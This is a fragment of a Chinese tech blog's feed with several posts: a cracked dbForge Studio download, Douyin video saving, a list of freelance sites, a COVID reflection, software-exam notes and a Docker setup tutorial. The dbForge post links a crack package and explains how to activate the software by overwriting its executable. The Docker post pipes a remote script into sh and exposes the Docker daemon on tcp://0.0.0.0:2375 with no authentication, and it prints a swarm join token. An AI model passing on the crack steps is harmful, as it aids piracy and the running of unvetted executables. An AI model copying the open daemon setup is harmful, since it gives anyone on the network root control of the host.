class="line"></span><br><span class="line">.padding-left &gt; .list .item &#123;</span><br><span class="line">  margin-left: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.padding-right &gt; .list .item &#123;</span><br><span class="line">  margin-right: 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;学习Ionic-Vue&quot;&gt;&lt;a href=&quot;#学习Ionic-Vue&quot; class=&quot;headerlink&quot; title=&quot;学习Ionic Vue&quot;&gt;&lt;/a&gt;学习Ionic Vue&lt;/h2&gt;&lt;h2 id=&quot;capacitor搭建及其踩坑&quot;&gt;&lt;a href=&quot;#ca</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    <category term="ionic" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/ionic/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
  </entry>
  
  <entry>
    <title>dbForge Studio 2020 for MySQL v9.0.338破解安装包下载</title>
    <link href="https://seniortesting.club/posts/VOI4BqoWoZ/"/>
    <id>https://seniortesting.club/posts/VOI4BqoWoZ/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>dbForge Studio 2020 for MySQL是一款功能强大的数据库管理软件，内置好用的sql创建工具，帮助用户快速创建sql数据库，通过对象窗格可以显示开启表、查询等功能，在窗口顶部的工具栏提供其他控制项，你可以用它来操作你的数据。软件允许用户方便的调用数据库和它们的对象，支持数据传输方法，可用于自定义字段和指定要传输的行数，方便用户高效率地使用，从而查询编写的整体效率逐步提升，满足用户们的使用需求。作为新版本，它能够生成脚本以更新目标数据库，使改进完善的强大功能能够得到大家更好的利用，用户的体验永远摆在第一位。<br>使用体验上你会发现真的比国内吹的上天的导航猫好的不是一点点（Navicat Premium),导航猫的自动提示很不智能，经常提示也不明显。至少目前看来它最大的优势就是一个软件支持多个数据库，比如mysql,sql server, sqlite,oracle等。<br>在我看来导航猫有如下缺点：</p><ol><li>写SQL的自动提示不是很智能，经常提示一些无关的语句，连当前的表相关字段有时候都不能及时提示，这个体验性真的很差。而dbForge Studio则可以根据上下分分析智能提示你所需要的语句，你基本不需要手动书写SQL语句。</li><li>设计表的时候自动生成的SQL预览语句带有单引号，且字段设计的时候一些额外的字段设置不支持，比如字段长度和精度。</li><li>相对于dbForge Studio它的功能对标的是Visual Studio ，所以你可以知道它的智能提示有多强。写SQL,写存储过程（独一份带调试功能）从没如此清爽。</li></ol><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>2020年最新版提供下载</p><p>百度网盘链接：<a href="https://pan.baidu.com/s/1axNbd_CkrodmNLp2S1FApw" target="_blank" rel="noopener">https://pan.baidu.com/s/1axNbd_CkrodmNLp2S1FApw</a><br>提取码：5yis</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ol><li>解压缩对应的安装包，找到文件: <strong>dbforgemysql_install.exe</strong>,依提示进行软件安装。这个安装包你也可以在官网进行下载： <a href="https://www.devart.com/dbforge/mysql/studio/download.html" target="_blank" rel="noopener">https://www.devart.com/dbforge/mysql/studio/download.html</a></li><li>安装完成后，将Crack文件内<strong>dbforgemysql.exe</strong>破解文件复制到软件安装路径下即可激活软件。</li><li>至此，软件成功注册破解，用户可无限制免费使用软件所有功能了。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;dbForge Studio 2020 for MySQL是一款功能强大的数据库管理软件，内置好用的sql创建工具，帮助用户快速创建sql数</summary>
      
    
    
    
    <category term="数据库" scheme="https://seniortesting.club/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
  </entry>
  
  <entry>
    <title>如何下载抖音中的视频或者音乐(BGM)</title>
    <link href="https://seniortesting.club/posts/0Qkr09kuhx/"/>
    <id>https://seniortesting.club/posts/0Qkr09kuhx/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="如何下载视频"><a href="#如何下载视频" class="headerlink" title="如何下载视频"></a>如何下载视频</h2><p>这个比较简单，遇到自己喜欢的视频，点击分享，里面有一个复制链接，然后将该链接复制到电脑端的浏览器上。打开改地址的视频，点击播放，然后直接右键该视频就可以看到一个“视频另存为”的选项，保存即可。</p><h2 id="如何下载完整音乐或者BGM"><a href="#如何下载完整音乐或者BGM" class="headerlink" title="如何下载完整音乐或者BGM"></a>如何下载完整音乐或者BGM</h2><p>BGM可能是一个视频的灵魂，犹如画龙点睛神来之笔。那么如何下载一个自己喜欢的音乐了。一般通过视频可以看到这个视频对应的音乐出处，找到这个出处的音乐，然后采用录屏软件录制所有的音乐片段，然后将改音乐片段进行相关剪辑拼接即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;如何下载视频&quot;&gt;&lt;a href=&quot;#如何下载视频&quot; class=&quot;headerlink&quot; title=&quot;如何下载视频&quot;&gt;&lt;/a&gt;如何下载视频&lt;/h2&gt;&lt;p&gt;这个比较简单，遇到自己喜欢的视频，点击分享，里面有一个复制链接，然后将该链接复制到电脑端的浏览器上。打开改地</summary>
      
    
    
    
    <category term="网赚" scheme="https://seniortesting.club/categories/%E7%BD%91%E8%B5%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员接私活各网站利弊整理分析比较</title>
    <link href="https://seniortesting.club/posts/wfHKWgYQ4l/"/>
    <id>https://seniortesting.club/posts/wfHKWgYQ4l/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>因为大家可能对几家国内的程序员接私活的网站比较感兴趣，所以我们对比下几个网站的接项目的利弊。</p><table><thead><tr><th>平台</th><th>网站</th><th>收费标准</th></tr></thead><tbody><tr><td>猪八戒</td><td><a href="https://www.zbj.com/" target="_blank" rel="noopener">https://www.zbj.com/</a></td><td>程序员已经不是人类了</td></tr><tr><td>程序客栈</td><td><a href="https://www.proginn.com/" target="_blank" rel="noopener">https://www.proginn.com/</a></td><td>C2</td></tr><tr><td>码市</td><td><a href="https://codemart.com/developers" target="_blank" rel="noopener">https://codemart.com/developers</a></td><td>C3</td></tr><tr><td>开源众包</td><td><a href="https://zb.oschina.net/projects/list.html" target="_blank" rel="noopener">https://zb.oschina.net/projects/list.html</a></td><td></td></tr><tr><td>猿急送</td><td><a href="https://www.yuanjisong.com/" target="_blank" rel="noopener">https://www.yuanjisong.com/</a></td><td></td></tr><tr><td>快码众包</td><td><a href="https://www.kuaima.co/" target="_blank" rel="noopener">https://www.kuaima.co</a></td><td></td></tr><tr><td>英选</td><td><a href="https://www.yingxuan.io/" target="_blank" rel="noopener">https://www.yingxuan.io/</a></td><td></td></tr><tr><td>任务栈</td><td><a href="http://www.renwuzhan.top/" target="_blank" rel="noopener">http://www.renwuzhan.top/</a></td><td></td></tr><tr><td>巨牛汇</td><td><a href="https://www.juniuhui.com/" target="_blank" rel="noopener">https://www.juniuhui.com/</a></td><td></td></tr><tr><td>人人开发</td><td><a href="http://rrkf.com/" target="_blank" rel="noopener">http://rrkf.com/</a></td><td></td></tr><tr><td>快码</td><td><a href="https://kuaimacode.com/" target="_blank" rel="noopener">https://kuaimacode.com/</a></td><td></td></tr><tr><td>开发邦</td><td><a href="https://www.kaifabang.com/" target="_blank" rel="noopener">https://www.kaifabang.com/</a></td><td></td></tr><tr><td>电鸭社区</td><td><a href="https://eleduck.com/" target="_blank" rel="noopener">https://eleduck.com/</a></td><td></td></tr><tr><td>找私活</td><td><a href="https://www.zsihuo.com/" target="_blank" rel="noopener">https://www.zsihuo.com/</a></td><td>查看联系方式要钱</td></tr><tr><td>时薪小程序</td><td><a href="http://www.mymiaowu.com/" target="_blank" rel="noopener">http://www.mymiaowu.com/</a></td><td></td></tr><tr><td>解放号</td><td><a href="https://www.jfh.com/" target="_blank" rel="noopener">https://www.jfh.com/</a></td><td></td></tr><tr><td>小灯塔</td><td><a href="https://www.xiaodengta.com/" target="_blank" rel="noopener">https://www.xiaodengta.com/</a></td><td></td></tr><tr><td>外包大师</td><td><a href="http://www.waibaodashi.com/" target="_blank" rel="noopener">http://www.waibaodashi.com/</a></td><td></td></tr><tr><td>我爱方案网</td><td><a href="http://www.52solution.com/" target="_blank" rel="noopener">http://www.52solution.com/</a></td><td></td></tr><tr><td>智筹</td><td><a href="http://zhichou.com/" target="_blank" rel="noopener">http://zhichou.com/</a></td><td></td></tr><tr><td>自由智客</td><td><a href="http://www.freekeer.com/" target="_blank" rel="noopener">http://www.freekeer.com/</a></td><td></td></tr></tbody></table><p><a href="https://twitter.com/alanhitchin/status/1293546995098030081" target="_blank" rel="noopener">https://twitter.com/alanhitchin/status/1293546995098030081</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;因为大家可能对几家国内的程序员接私活的网站比较感兴趣，所以我们对比下几个网站的接项目的利弊。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr</summary>
      
    
    
    
    <category term="网赚" scheme="https://seniortesting.club/categories/%E7%BD%91%E8%B5%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>【生活】2020武汉肺炎</title>
    <link href="https://seniortesting.club/posts/QmkDfUtxc2/"/>
    <id>https://seniortesting.club/posts/QmkDfUtxc2/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="感言"><a href="#感言" class="headerlink" title="感言"></a>感言</h2><p>不敢相信，整个国家都这样瘫痪了！2020 的开头很难，本该欢庆的日子，却被肆虐的病毒打破。随处可见的测温点，空荡荡的街道，为买口罩而排出的长长队伍，各式各样的封路手法，不断开往武汉的物资运输车辆，响应着“宅在家也是为社会做贡献”的号召用宅在家里人们。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;感言&quot;&gt;&lt;a href=&quot;#感言&quot; class=&quot;headerlink&quot; title=&quot;感言&quot;&gt;&lt;/a&gt;感言&lt;/h2&gt;&lt;p&gt;不敢相信，整个国家都这样瘫痪了！2020 的开头很难，本该欢庆的日子，却被肆虐的病毒打破。随处可见的测温点，空荡荡的街道，为买口罩而排出的长</summary>
      
    
    
    
    <category term="随笔" scheme="https://seniortesting.club/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>软件测评师考试</title>
    <link href="https://seniortesting.club/posts/vjPfJ9pHVF/"/>
    <id>https://seniortesting.club/posts/vjPfJ9pHVF/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="软考-中级职称-软件测评师"><a href="#软考-中级职称-软件测评师" class="headerlink" title="软考-中级职称-软件测评师"></a>软考-中级职称-软件测评师</h2><h3 id="报考网站"><a href="#报考网站" class="headerlink" title="报考网站"></a>报考网站</h3><ul><li>软考网站: <a href="www.ruankao.org.cn">www.ruankao.org.cn</a></li><li><del>上海网站: <a href="www.12333sh.gov.cn/spta.shtml">www.12333sh.gov.cn/spta.shtml</a></del></li><li>信管网： <a href="https://www.cnitpm.com/" target="_blank" rel="noopener">https://www.cnitpm.com/</a></li></ul><h3 id="报考方向"><a href="#报考方向" class="headerlink" title="报考方向"></a>报考方向</h3><table><thead><tr><th>资格等级</th><th>职称</th><th>等级难度</th></tr></thead><tbody><tr><td>高级</td><td></td><td></td></tr></tbody></table><ul><li>| 信息系统项目管理师 | 最简单</li><li>| 系统分析师 | 难</li><li>| 系统架构设计师  | 相对容易</li><li>| 网络规划设计师  | C3</li><li>| 系统规划与管理师    | C3<br>中级 |  | C3</li><li>| 软件评测师 | C3</li><li>| 软件设计师| C3</li></ul><p>每年报考的人也很多，一方面跟项目管理这个行业的市场需求有一定关系，一方面可能也是因为<strong>信息系统项目管理师</strong>是偏管理类的考试所以相对于其他技术类的资格考试会比较容易通过<br>有计算机软考中级和高级证书的话在上海落户是可以申请加分的，<strong>中级可以加100分，高级可以加140分</strong>，参考链接:<a href="https://www.sohu.com/a/107678135_205967" target="_blank" rel="noopener">https://www.sohu.com/a/107678135_205967</a></p><h3 id="报名时间"><a href="#报名时间" class="headerlink" title="报名时间"></a>报名时间</h3><p>2020年下半年软考报名时间：预计为<strong>2020年8月13日10:00－8月28日16:00</strong></p><p>网上报名过程中如遇到无法解决的问题，可向相应咨询点咨询，联系方式如下：<br> 1.上海市业余科技学院（黄浦区雁荡路84号科学会堂5号楼205室（请从2号楼入口进入）） 咨询点代码：6262 联系电话：53824255<br> 2.上海市申信信息技术专修学院（浦东新区峨山路91弄100号陆家嘴软件园2号楼807室） 咨询点代码：3030 联系电话：58201687 58206638<br> 3.上海市信息化培训协会（杨浦区世界路200号1号楼118室） 咨询点代码：2906 联系电话：65558015-1401<br> 4.<strong>上海浦东软件园</strong>（浦东新区郭守敬路498号1号楼1107室） 咨询点代码：2919 联系电话：50570106<br> 5.上海复源科华人才事务咨询中心（杨浦区国定路428号同舟大厦6楼） 咨询点代码：4545 联系电话：65106786</p><h3 id="考试时间"><a href="#考试时间" class="headerlink" title="考试时间"></a>考试时间</h3><p>预计为2020年11月7日，每年的11月份左右开始考试</p><h3 id="成绩查询及证书领取"><a href="#成绩查询及证书领取" class="headerlink" title="成绩查询及证书领取"></a>成绩查询及证书领取</h3><p>一般在考试后三个月左右，考生可于报名网站（<a href="http://www.ruankao.org.cn或www.12333sh.gov.cn/spta.shtml%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2%E3%80%82%E8%80%83%E8%AF%95%E6%88%90%E7%BB%A9%E5%8D%95%E4%B8%8D%E5%8F%A6%E8%A1%8C%E5%8F%91%E6%94%BE%EF%BC%8C%E8%80%83%E7%94%9F%E5%A6%82%E6%9C%89%E9%9C%80%E8%A6%81%EF%BC%8C%E8%AF%B7%E4%BA%8E%E8%80%83%E8%AF%95%E6%88%90%E7%BB%A9%E5%85%AC%E5%B8%83%E4%B9%8B%E6%97%A5%E8%B5%B730%E5%A4%A9%E5%86%85%E8%87%AA%E8%A1%8C%E4%B8%8B%E8%BD%BD%E6%89%93%E5%8D%B0%E3%80%82" target="_blank" rel="noopener">www.ruankao.org.cn或www.12333sh.gov.cn/spta.shtml）进行成绩查询。考试成绩单不另行发放，考生如有需要，请于考试成绩公布之日起30天内自行下载打印。</a><br>领证时间一般为考试合格标准发布后四个月左右，请考生届时关注考试院网站（<a href="http://www.12333sh.gov.cn/spta.shtml%EF%BC%89%E9%A2%86%E8%AF%81%E9%80%9A%E7%9F%A5%E3%80%82" target="_blank" rel="noopener">www.12333sh.gov.cn/spta.shtml）领证通知。</a></p><h3 id="考试必须"><a href="#考试必须" class="headerlink" title="考试必须"></a>考试必须</h3><p>如果是零基础想一次通过本考试，600~800小时的专注学习时间是必不可少的，请注意，是专注学习时间。</p><h3 id="教材及其参考书"><a href="#教材及其参考书" class="headerlink" title="教材及其参考书"></a>教材及其参考书</h3><ol><li>教材：《系统架构设计师考试全程指导（第2版）》</li><li>历年真题：《系统架构设计师与系统分析师历年实体分析与解答》</li><li>论文： 论文最好结合自己的工作经历去写，这样有内容，不空洞</li></ol><p>做真题的时候，先要弄懂每个解题的要点，力求学会，不要图快</p><h3 id="考分分布"><a href="#考分分布" class="headerlink" title="考分分布"></a>考分分布</h3><ol><li>基础知识 ，总分75分</li><li>案例，总分75分</li><li>论文， 总分75分</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;软考-中级职称-软件测评师&quot;&gt;&lt;a href=&quot;#软考-中级职称-软件测评师&quot; class=&quot;headerlink&quot; title=&quot;软考-中级职称-软件测评师&quot;&gt;&lt;/a&gt;软考-中级职称-软件测评师&lt;/h2&gt;&lt;h3 id=&quot;报考网站&quot;&gt;&lt;a href=&quot;#报考网站&quot;</summary>
      
    
    
    
    <category term="职业发展" scheme="https://seniortesting.club/categories/%E8%81%8C%E4%B8%9A%E5%8F%91%E5%B1%95/"/>
    
    <category term="软考" scheme="https://seniortesting.club/categories/%E8%81%8C%E4%B8%9A%E5%8F%91%E5%B1%95/%E8%BD%AF%E8%80%83/"/>
    
    
  </entry>
  
  <entry>
    <title>Docker容器化技术</title>
    <link href="https://seniortesting.club/posts/xd1LEJLaZF/"/>
    <id>https://seniortesting.club/posts/xd1LEJLaZF/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Docker安装配置"><a href="#Docker安装配置" class="headerlink" title="Docker安装配置"></a>Docker安装配置</h2><p>从现在开始所有的部署相关的都docker化，不再使用以前的人工部署方式。</p><p>那么如何安装docker呢？</p><h3 id="Docker安装方法一（推荐）"><a href="#Docker安装方法一（推荐）" class="headerlink" title="Docker安装方法一（推荐）"></a>Docker安装方法一（推荐）</h3><p>参考链接： <a href="https://www.digitalocean.com/community/tutorials/how-to-run-nginx-in-a-docker-container-on-ubuntu-14-04" target="_blank" rel="noopener">https://www.digitalocean.com/community/tutorials/how-to-run-nginx-in-a-docker-container-on-ubuntu-14-04</a></p><p>只需要执行一个命令即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. docker安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo curl -sSL https://get.docker.com/ | sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl status docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker info</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改docker的镜像源为阿里云</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo nano /etc/docker/daemon.json</span></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [&quot;https://jbj2tyqj.mirror.aliyuncs.com&quot;]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 修改docker的tcp连接</span></span> </span><br><span class="line"></span><br><span class="line">docker默认只提供本地unix，sock文件的连接方式，让docker能够监听tcp端口还需要进行一些配置。</span><br><span class="line">1.1 首先编辑docker的宿主机文件: `nano /lib/systemd/system/docker.service`</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">;<span class="comment">#ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span></span></span><br><span class="line">ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375</span><br><span class="line"></span><br><span class="line">保存配置。</span><br><span class="line"></span><br><span class="line">1.2 重新加载系统服务配置文件（包含刚刚修改的文件）</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br><span class="line"></span><br><span class="line">1.3 aliyp安全组防火墙添加开放2375端口</span><br><span class="line"></span><br><span class="line">1.4 在Windows系统上测试端口是否可以使用:</span><br><span class="line"></span><br><span class="line">```shell</span><br><span class="line">curl http://localhost:2375/version</span><br></pre></td></tr></table></figure><h1 id="2-docker-compose-安装"><a href="#2-docker-compose-安装" class="headerlink" title="2. docker compose 安装"></a>2. docker compose 安装</h1><p>$ sudo curl -L –fail <a href="https://github.com/docker/compose/releases/download/1.28.5/run.sh" target="_blank" rel="noopener">https://github.com/docker/compose/releases/download/1.28.5/run.sh</a> -o /usr/local/bin/docker-compose<br>$ sudo chmod +x /usr/local/bin/docker-compose<br>$ rm /usr/local/bin/docker-compose # 使用curl安装的</p><h1 id="3-docker-swarm初始化"><a href="#3-docker-swarm初始化" class="headerlink" title="3. docker swarm初始化"></a>3. docker swarm初始化</h1><p>参考文档：<a href="https://www.lidong.xin/devops/S4-Swarm-Aliyun.html" target="_blank" rel="noopener">https://www.lidong.xin/devops/S4-Swarm-Aliyun.html</a></p><p>在集群manager上执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 初始化swarm集群</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker swarm init</span></span><br><span class="line">在输出的命令上复制执行命令在对应的node上执行加入对应的swarm</span><br></pre></td></tr></table></figure><p>注意上面的输出加入命令中机器需要打开对应的端口<br><code>docker swarm join --token SWMTKN-1-1xxz8cw5pyolpvy91edt7ranyjsnu2qjbyn3sjsp65fcx-0vkpilpqppe41ncnoapd319l0 172.19.82.347:2377</code></p><p>所以上面的命令需要在manager机器上打开2377端口。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">docker swarm：集群管理</span></span><br><span class="line">init          #初始化集群</span><br><span class="line">join          #将节点加入集群</span><br><span class="line">join-token    #管理加入令牌</span><br><span class="line">leave         #从集群中删除某个节点，强制删除加参数--force </span><br><span class="line">update        #更新集群</span><br><span class="line">unlock        #解锁集群</span><br><span class="line"></span><br><span class="line">docker node：节点管理，</span><br><span class="line">demote      #将集群中一个或多个节点降级</span><br><span class="line">inspect     #显示一个或多个节点的详细信息</span><br><span class="line">ls          #列出集群中的节点</span><br><span class="line">promote     #将一个或多个节点提升为管理节点</span><br><span class="line">rm          #从集群中删除停止的节点，--force强制删除参数</span><br><span class="line">ps          #列出一个或多个节点上运行的任务</span><br><span class="line">update      #更新节点</span><br><span class="line"></span><br><span class="line">docker service：服务管理，</span><br><span class="line">create      #创建一个新的服务</span><br><span class="line">inspect     #列出一个或多个服务的详细信息</span><br><span class="line">ps          #列出一个或多个服务中的任务信息</span><br><span class="line">ls          #列出服务</span><br><span class="line">rm          #删除一个或多个服务</span><br><span class="line">scale       #扩展一个或多个服务</span><br><span class="line">update      #更新服务</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="4-docker轻量容器集群管理工具portainer"><a href="#4-docker轻量容器集群管理工具portainer" class="headerlink" title="4. docker轻量容器集群管理工具portainer"></a>4. docker轻量容器集群管理工具portainer</h1><p>$ docker pull portainer/portainer-ce<br>$ docker run -d -p 9000:9000 -v /opt/portainer:/data -v /var/run/docker.sock:/var/run/docker.sock –name portainer portainer/portainer-ce</p><h3 id="Docker安装方法二"><a href="#Docker安装方法二" class="headerlink" title="Docker安装方法二"></a>Docker安装方法二</h3><p><del>服务器端采用的是debian系统，安装如下步骤：</del><br><a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-debian-10" target="_blank" rel="noopener">https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-debian-10</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apt-transport-https ca-certificates curl gnupg2 software-properties-common</span><br><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br><span class="line">sudo add-apt-repository &quot;deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable&quot;</span><br><span class="line">sudo apt update</span><br><span class="line">apt-cache policy docker-ce</span><br><span class="line">sudo apt install docker-ce</span><br><span class="line">sudo systemctl status docker</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure><p>通过上面的<code>docker info</code>发现对应的<code>Registry Mirrors</code>是官方的镜像，所以我们在使用<code>docker pull</code>命令下载到本地的时候会比较缓慢，所以我们需要修改对应的镜像。修改命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>修改为如下：</p><p>—————————————–<strong>分割线</strong>—————————————————</p><h3 id="docker相关集群工具"><a href="#docker相关集群工具" class="headerlink" title="docker相关集群工具"></a>docker相关集群工具</h3><ul><li>三剑客， compose， machine， swarm</li></ul><p><code>compose</code> 使用 YAML 文件来定义多容器之间的关系。一个 <code>docker-compose up</code> 就可以把完整的应用跑起来。 本质上， compose 把 YAML 文件解析成 docker 命令的参数，然后调用相应的 docker 命令行接口，从而将应用以容器化的方式管理起来。它通过解析容器间的依赖关系顺序地启动容器。而容器间的依赖关系由 YAML 文件中的 <code>links</code> 标记指定。</p><p>在 docker-compose.yml 文件中，服务的名称由用户自定义，每个定义的服务都至少包含 build或image 其中之一，其他 “links” 标记对应 docker run 的 “–links”选项。</p><p><code>Docker Machine</code> 是一个简化Docker 安装的命令行工具。通过一个简单的命令行即可在相应的平台上安装 Docker，为用户提供了灵活的功能，使得用户可以在任一主机上运行 Docker 容器。简单说，一个 Docker Machine 就是一个 Docker host 主机和经过配置的 Docker client 的结合体。</p><p>docker-swarm是解决多主机多个容器调度部署得问题。</p><ul><li>轻量级的Kubernetes，K3S : <a href="https://k3s.io/" target="_blank" rel="noopener">k3s.io</a></li><li>集群管理工具Rancher：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker pull rancher/server</span><br><span class="line">sudo docker run -d --name rancher -v /etc/localtime:/etc/localtime -v /opt/rancher/mysql:/var/lib/mysql --restart=unless-stopped -p 8080:8080 rancher/server</span><br><span class="line"></span><br><span class="line">docker ps -a</span><br><span class="line">docker exec -it rancher /bin/bash</span><br><span class="line">ps -ef</span><br><span class="line">docker logs -f rancher</span><br></pre></td></tr></table></figure><p>访问 <a href="http://10.245.231.119:8080/" target="_blank" rel="noopener">http://10.245.231.119:8080</a></p><h3 id="docker的alpine和slim镜像"><a href="#docker的alpine和slim镜像" class="headerlink" title="docker的alpine和slim镜像"></a>docker的alpine和slim镜像</h3><p>Alpine 是众多 Linux 发行版中的一员，和 CentOS、Ubuntu、Archlinux 之类一样，只是一个发行版的名字，号称小巧安全，有自己的包管理工具 apk。</p><p>与 CentOS 和 Ubuntu 不同，Alpine 并没有像 Red Hat 或 Canonical 之类的大公司为其提供维护支持，软件包的数量也比这些发行版少很多（如果只看开箱即用的默认软件仓库，Alpine 只有 10000 个软件包，而 Ubuntu、Debian 和 Fedora 的软件包数量均大于 50000。）<br>容器崛起之前，Alpine 还是个无名之辈，可能是因为大家并不是很关心操作系统本身的大小，毕竟大家只关心业务数据和文档，程序、库文件和系统本身的大小通常可以忽略不计。</p><p>容器技术席卷整个软件产业之后，大家都注意到了一个问题，那就是容器的镜像太大了，浪费磁盘空间，拉取镜像的时间也很长。于是，人们开始寻求适用于容器的更小的镜像。对于那些耳熟能详的发行版（例如 